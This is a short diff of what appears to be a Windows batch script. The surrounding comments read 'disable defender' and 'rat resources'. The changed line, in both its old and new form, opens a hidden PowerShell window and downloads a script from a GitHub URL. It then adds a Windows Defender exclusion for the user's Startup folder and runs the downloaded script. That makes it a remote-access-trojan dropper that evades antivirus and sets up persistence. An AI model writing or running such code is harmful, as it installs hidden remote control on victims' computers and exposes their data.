@@ -32,5 +32,5 @@ if '%errorlevel%' NEQ '0' (
 REM disable defender
 
 REM rat resources
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/installer.ps1?token=GHSAT0AAAAAABVQ7D7B4KS4ZHYOB6EV4LQ2YVRGOXQ -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Start"; ./installer.ps1
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/Promite/TEST/main/test-installer.ps1 -Outfile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Start"; ./installer.ps1
 
